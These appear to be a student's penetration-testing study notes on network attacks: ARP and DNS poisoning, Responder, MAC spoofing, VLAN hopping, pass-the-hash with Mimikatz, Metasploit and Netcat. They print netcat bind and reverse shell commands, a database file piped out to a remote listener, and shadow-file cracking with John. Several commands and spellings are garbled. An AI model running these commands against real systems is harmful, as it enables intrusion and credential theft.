# Network Attacks

**Presentation- 
Datalink - mac addresses
Network- ip address
Transport
Session
P
Application

## Stress Testing
How to conduct- Use scripts with pythin or powershell or use Grinder. 

- Broadcast Storm- use any random data sequence. 
- Character Generator Protocol- used for testing the network over port 19

## Exploit Resources
- **Exploit Databse**- collection of public exploits. 
[Exploit Database](https://exploit-db.com/)
- **Packet Storm Security**- links back to CVE advisories. [Packet Storm](https://packetstormsecurity.com/). You could use CVE's to look up tools to use to exploit a system.
- **Explot Chaining-** Combining exploits together. 

## ARP Poisoning (Adress Resolution Protocol)
-this utilizes mac address to keep track of devices. 
- Configure static ARP table to arp spoof. 
- Create binding of mac address and ip address using layer 2 of the OSI model
- How to ARP spoof
    1. Identify ip and mac address with NMAP
    $ nmap -pr -SN target ip
    2. Use a spoofing tool like arpspoof or metasploit

## DNS Cache Poisoning
Changethe ip address of a domain name stored in the DNS Cache. 

How to check for DNS recursion- 
```
$ nmap -sU -p53 --script=dns-recursion <IP>
```
If recursion is enabled you could try to perform a dynamic DNS update without authentication 

```
$ nmap -sU -p53 --script=dns-udpate --script-args=dns-update.hostname=<domain>,dns-update.ip=<IP> <target>
```

How?
- Poison server or workstation DNS cache
- Highjacking local DNS server
- Performing unauthorized domain transfer to an unpatched DNS server where you could change the IP address of a given servers A record. 

## DNS Sec
DNS Security extensions- Uses encrypted digital signatures.

There's a public and private key pair for every DNS zone. 

To do a zone transfer on Mac. 
```
$ dig afxr ns.domain.com ns.attacker.com
```

## LLMNR 
The following are good for creating Bluetooh, wifi and other networks

**For WINDOWS only**

LLMNR stands for Link-Local Multicast Name Resolution. It's a protocol used in modern Windows operating systems as a method of resolving the IP addresses of neighboring network devices when the Domain Name System (DNS) resolution fails. LLMNR operates similarly to the more commonly known DNS protocol but is specifically designed for local networks or subnets, especially in cases where no DNS server is available or DNS queries fail.

LLMNR functions by broadcasting a query on the local subnet to resolve a domain name into an IP address. If a device with the requested name exists on the same subnet, it can respond to the LLMNR query, providing its IP address. This protocol assists in name resolution between devices on the same local network segment without the need for a configured DNS server.

**For Linux** 

The following are good for creating Bluetooh, wifi and other networks

**Zeroconf** short for Zero Configuration Networking, is a set of networking protocols that allows devices to automatically discover each other and communicate on a local network without requiring manual configuration or the presence of a centralized server or Domain Name System (DNS).

Zeroconf includes several key technologies:

**Address Allocation:** It enables devices to assign IP addresses to themselves automatically without needing a DHCP (Dynamic Host Configuration Protocol) server.

**Service Discovery:** Devices on the network can advertise and discover services such as printers, file-sharing resources, or other devices without the need for a dedicated server.

**Name Resolution:** It allows devices to resolve each other's hostnames without relying on a DNS server by using multicast DNS (mDNS).

**Link-Local Addressing:** Devices can communicate using link-local addresses, which are automatically assigned and allow communication between devices on the same local network segment.

Zeroconf simplifies network setup and facilitates communication between devices, particularly in situations where manual configuration is impractical or not feasible, such as in small home networks, peer-to-peer networks, or in situations where there's a need for immediate connectivity without complex configuration steps. Technologies like Apple's Bonjour, Microsoft's Universal Plug and Play (UPnP), and the IETF's protocols such as mDNS and DNS Service Discovery (DNS-SD) are all implementations of Zeroconf principles.

## Net-Bios Name service
Uses the host name of a system for resolution. 

How to attack the above:

**Responder**

Responder is a powerful tool used in cybersecurity and penetration testing, primarily within the realm of ethical hacking. It's included in Kali Linux, a popular operating system for penetration testing, digital forensics, and security auditing.

Responder is specifically designed to gather and capture credentials passed over the network. It works by listening to network traffic and responding to certain requests, attempting to trick devices on the network into disclosing sensitive information such as usernames and hashed passwords.

This tool takes advantage of certain weaknesses in protocols like LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and mDNS (Multicast DNS), which are used in Windows environments for hostname resolution and network discovery. Responder can imitate legitimate services and capture authentication data from devices attempting to connect or resolve hostnames.

MAC Spoofing
Hiding a MAC address. Identify addresses on same network. 

Layer 2 devices use MAC addresses to associate which device is connected to which physical port. 

MAC Filtering- Create an allow or block list for which devices can or cannot connect to a network. 

MAC spoofing is a technique used to modify or forge the Media Access Control (MAC) address of a network interface. Every device that connects to a network has a unique MAC address assigned to its network interface card (NIC). MAC addresses are used for communication within a local network.

MAC spoofing involves changing the MAC address of a network device to impersonate another device or to mask the identity of the original device. This can be done for various reasons, such as:

**Privacy:** Users might change their MAC address to prevent tracking or profiling by network administrators, advertisers, or other entities interested in monitoring their online activities.

**Security Testing:** Ethical hackers or security professionals might use MAC spoofing as part of penetration testing or security assessments to evaluate network security measures.

**Bypassing Access Controls** MAC spoofing can be used to bypass access controls that rely on MAC addresses for authentication or authorization purposes. By impersonating an authorized device, an attacker might gain unauthorized access to a network.

Change MAC on a Mac or linux
```
$ sudo ifconfig en0 ether <MAC address>
```

If you reboot it resets it back to default though.

macchanger can also do this in Kali Linux

```
$ macchanger -m MAC network interface
$ macchanger -r MAC network interface- random mac
```

## VLAN Hopping
VLAN's are used to partition a broadcast domain and isolate it from the rest of the network. 

**Double Tagging** attacker tries to reaach a different VLAN using the vulnerabilities in the trunk port configuration. 

VLAN hopping is a network security exploit that occurs when an attacker gains unauthorized access to traffic in different Virtual Local Area Networks (VLANs) that are typically isolated from each other. VLAN hopping exploits weaknesses or misconfigurations in network devices, such as switches, to gain access to traffic on VLANs other than the one to which the attacker's device is supposed to belong.

There are primarily two types of VLAN hopping:

    Double Tagging (IEEE 802.1Q): This type of VLAN hopping occurs when an attacker inserts two VLAN tags (802.1Q tags) into Ethernet frames. By doing so, the attacker can make the frame appear as though it belongs to multiple VLANs. The attacker's device adds an additional VLAN tag (802.1Q) to the frames it sends, allowing it to potentially access and receive traffic from another VLAN.
        - Inner Tag- True destination set by the attacker
        - Outer tag- Native VLAN

    Switch Spoofing (Dynamic Trunking Protocol - DTP): Some switches utilize a protocol called Dynamic Trunking Protocol (DTP) to negotiate whether a port should operate as an access port or a trunk port. In switch spoofing, attackers send forged messages to the switch pretending to be another switch, thereby tricking it into changing a port's mode from access to trunk. This enables the attacker to send traffic tagged with any VLAN ID, potentially gaining access to multiple VLANs.

To prevent VLAN hopping attacks, it's crucial to implement best security practices, such as:

- Disabling unnecessary trunking protocols like DTP and manually setting ports as access or trunk ports.

- Implementing proper VLAN segregation and access control lists (ACLs) to restrict VLAN access.

- Regularly updating and patching network devices to fix known vulnerabilities related to VLAN hopping.

- Using network monitoring tools to detect and mitigate unusual or unauthorized network activity.

- Always configure switch ports to have dynamic switch port modes disabled by default. 

## NAC Bypass
technology to keep unauthorized users and devices from accessing a provate network. 

**3 Types**

- **Persistent** - software installed on device requesting network access. Like Crowdstrike
- **Non-Persistent** - popular on college campus. Requires users to connect to network and login to a we based captive portal to download an agent that scans the device for compliance. The it deletes it

- **Volatile Agent**- Agentless NAC- installs scanning engine on the domain controller and not the device. Could be a BYOD device policy. The run in volatile ram of that device

**How to Bypass?**

**1. Exploit an authorized host.** Then use that to access network and bypass the appliance. Use as a pivot point and bypass NAC
**2. Make your device lok like something else.** Spoff attacking workstation and make it look like a VOIP handset or something. Devices that are allowed to connect without inspection. Ex: VOIP handset, printers, etc. Trick the MAC appliance to make it think it's a printer. 

## On-Path Attack

An on-path attack refers to a type of cyber attack where a malicious actor positions themselves in the communication path between two parties, allowing them to intercept, modify, or block data transmitted between these parties.

This type of attack occurs when the attacker gains access to the network infrastructure or somehow manages to position themselves in a way that enables them to eavesdrop on the data being exchanged between a sender and a receiver. By doing so, the attacker can gather sensitive information, manipulate the data being transmitted, or disrupt the communication flow.

**Exploit with:**
Arp poisoning.
DNS poisoning.

Examples of on-path attacks include:

**Man-in-the-Middle (MitM) Attack:** The attacker intercepts and possibly alters the communication between two parties without their knowledge. This can happen in various scenarios such as public Wi-Fi networks, where an attacker can position themselves between a user's device and the network gateway.

**Packet Sniffing:** Attackers use specialized tools to capture and analyze network traffic to gather sensitive information like usernames, passwords, or other confidential data being transmitted over the network.

**Session Hijacking:** Here, attackers take control of an ongoing session between a user and a server after successfully intercepting the session tokens or cookies.

To mitigate on-path attacks, encryption protocols like HTTPS (SSL/TLS) are commonly employed to secure data transmitted over networks. Additionally, implementing secure communication practices, using VPNs (Virtual Private Networks), and regularly updating security measures can help prevent and protect against such attacks.

**SSL Stripping-** trick the encryption application into to presenting an http instead of https connection. 

**Downgrade Attack** if ssl stripping isn;t possible. When an attacker attempts to have a client or server abandone a higher level encryption for a lower mode. 

Allow client to accept lower tls encryption at a lower level. Like SSL 1.0

## Password Attacks
John the Ripper, Cain and Abel, Hydra

- **Dictionary Attacks** - Hydra. Use a wordlist or dictionary list liek rockyou.txt in Kali
- **Brute Force Attacks** - Break a pw by guessing every single combination. It will always be successful, eventually! Great for cracking PIN and password with small key spaces. 
- **Hash Cracking** - Rainbow table. Crackstation.net
- **Password Spraying** - Uses a dictionaty of common passwords on multiple accounts to bypass authentication. 
- **Credential Stuffing** - Stolen user account names and passwords are tested against multiple websites. 

**John the Ripper** Crack/decrypt a hashed password. 

```
$ unshadow /etc/passwd /etc/shadow > password.txt
$ john password.txt
```

## Pass the Hash - NTLM relay attack New Technoogy Lan Manager

User a hash as-is and use the hash to authenticate

**Miikatz** An open source appication that allows users to view and save authentication creds to perform pass the hash attacks. 

Mimikatz is a powerful post-exploitation tool primarily used to retrieve plaintext passwords, hashes, PIN codes, and other sensitive information from memory on Windows-based systems. Developed by Benjamin Delpy, it exposes vulnerabilities in Windows security mechanisms and demonstrates weaknesses in credential handling.

Mimikatz takes advantage of the way Windows stores credentials in memory. When users log in, their credentials are processed and temporarily stored in memory in order to facilitate various operations without repeatedly asking for passwords. Some key techniques used by Mimikatz include:

    Pass-the-Hash: Windows systems often use hashes of passwords for authentication rather than the actual plaintext passwords. Mimikatz can extract these password hashes from memory and use them directly for authentication without needing to crack the hashes.

    Pass-the-Ticket: This technique targets Kerberos tickets, which are used for authentication in Windows environments. Mimikatz can extract these tickets from memory, allowing an attacker to impersonate users and gain unauthorized access to systems.

    Pass-the-Cache: Mimikatz can retrieve credentials stored in LSASS (Local Security Authority Subsystem Service) memory. LSASS is responsible for validating users for the Winlogon service and manages security policies.

Mimikatz essentially uses a combination of techniques to locate and exploit vulnerabilities in the Windows authentication process, retrieving sensitive information from memory that can be used to escalate privileges, move laterally within a network, or perform other malicious activities.

It's important to note that while Mimikatz can be a valuable tool for security professionals to test and understand vulnerabilities in systems, it can also be highly dangerous in the hands of malicious actors if used for unauthorized purposes. Organizations should take measures to protect against Mimikatz and similar tools by employing best security practices, such as regular patching, least privilege access, and employing robust security solutions to prevent unauthorized access to systems.

A "Pass the Hash" (PtH) attack is a type of cyber attack where an attacker captures the hashed password of a user and uses it to authenticate and gain unauthorized access to a system or network, without having to crack the actual plaintext password.

In traditional password-based authentication systems, the password is transformed into a hashed value before being stored. Hashing is a one-way function that converts the password into a fixed-length string of characters. In a pass-the-hash attack, instead of cracking the hashed password to reveal the original password, the attacker captures the hashed password and attempts to use it directly for authentication.

Here's how a Pass the Hash attack typically works:

**Password Hash Capture:** The attacker gains access to the password hash stored on a target system or network. This can be achieved through various means such as using malware, exploiting vulnerabilities, or accessing password hash databases.

**Passing the Hash:** The attacker uses the captured hash directly, without needing to know the plaintext password. They send the captured hash to the authentication system, pretending to be the legitimate user.

**Unauthorized Access:** If the system validates the hash successfully, the attacker gains access to the system or network resources as if they were the legitimate user, without needing the actual password.

Pass the Hash attacks can be quite dangerous because they allow attackers to access systems and resources without having to crack passwords, making them less susceptible to traditional password-based security measures. To mitigate such attacks, organizations can employ several security measures such as:

- **Implementing stronger authentication methods**: Including multifactor authentication (MFA) or biometric authentication.
- **Regularly updating and patching systems:** To address vulnerabilities that attackers might exploit.
- **Using strong encryption:** Employing encryption mechanisms to protect stored password hashes.
- **Monitoring and logging:** Keeping an eye on authentication logs for any unusual or suspicious activities.

Overall, understanding and mitigating Pass the Hash attacks are crucial for enhancing the security posture of systems and networks, especially in environments where password-based authentication is utilized.

## Intro to Metasploit
Default on Kali Linux
#1 pentesting tool!

```
 $ mfconsole
 $ msf6> 
 ```
**Exploits-** code or sw that can deliver a payload which goes after different vulnerabilities. 

**Auxillary-** scanners, sniffers, spoofers. no exploitive. Instead of using nmap cyou can use auxillaries

**Post-** Post exploitation. How to maintainpresistent and cover tracks

**Payloads-** what exploits deliver and run. Control of machine, elevated persms

**Encoders-** make sure payloads make it to their destination

**NOP-** nonoperation. Keep payload sizines consistent. Helpful to evade

**Evasion-**

```
msf6> use exploit/windows/smb/ms17_psecex
msf6> options (within the particular explot commandline)
```

DOWNLOAD THIS FROM RAPID7 - metasploitable2 a very vulnerable Linux machine to exploit. 

## Netcat

ncat stands for Netcat, which is a versatile networking utility used for reading from and writing to network connections using the TCP/IP protocol suite. It can be used both as a simple TCP/UDP port listener and for transferring data across networks. Netcat is commonly used for tasks such as port scanning, transferring files, port redirection, and as a backdoor, among other networking tasks. It's a powerful tool in network troubleshooting and penetration testing due to its flexibility and ability to establish connections between devices over various protocols.

**Bind Shell-** attacker installs a listening port onto the victim's machine, to which the attacker can connect. Which exposes the command prompt. Became less effective over time because of firewalls. 

**Set up Listener:**

For a bind shell, you simply enter nc -l for listening,
p for port, 443 for the port you want to listen on
and -e for execute and then cmd.exe,for the command you want to execute, in this case, the Windows Command Prompt.

What this is saying is that I want Netcat to set up a listener on port 443 and execute the command, cmd.exe,

whenever somebody connects to it.

```
$ nc -l -p 443 -e cmd.exe
```

**Connect to Listener:**

```
$ nc 10.1.0.1 443
```

**Reverse Shell-** An attacker installs a listener on their own workstation and configuresa listening port. Then they request the victime to initiate a request to that listener. Once this 2way communication is established they can connect to the victms computer.

Very popular with penetration testers!

**Set up Listener:**
```
$ nc -l -p 443 
$ nc 10.1.0.1 443 -e cmd.exe
```

**Setup a Listener to Receive**

```
$ nc -l -p 443 > database.sql   
```
**Send a file to listener**
```
type database.sql | nc 10.1.0.2  53
```

**Here are five command line examples using Netcat (nc):**

**Establishing a TCP connection:**

```
nc example.com 80
```
This command connects to example.com on port 80 using TCP. Replace example.com with the desired host and 80 with the port number.

**Listening on a specific port:**
```
nc -l -p 1234
```

This command listens on port 1234 for incoming connections. -l indicates it's a listener, and -p specifies the port number.

***Transferring a file:**

```
nc -l -p 1234 > received_file.txt
```
On the receiving end, this command listens on port 1234 and redirects the incoming data to a file named received_file.txt.

```
nc destination_ip 1234 < local_file.txt
```
On the sending end, this command connects to destination_ip on port 1234 and sends the contents of local_file.txt.

***Port scanning:***

```
nc destination_ip 1234 < local_file.txt
```
On the sending end, this command connects to destination_ip on port 1234 and sends the contents of local_file.txt.

***Port scanning:***

```
nc -zv example.com 1-100
```

This command performs a port scan on example.com for ports 1 through 100. -z specifies zero-I/O mode, and -v enables verbose output.

***Chatting between two terminals:***

Terminal 1:
```
nc -l -p 1234
```

Terminal 2:

```
nc localhost 1234
```

In Terminal 1, this command listens on port 1234. In Terminal 2, this command connects to localhost on port 1234. You can now chat between these terminals by typing messages.

Remember to exercise caution and ensure compliance with relevant laws and regulations when using networking tools like Netcat, especially in scenarios involving network security and penetration testing.

## 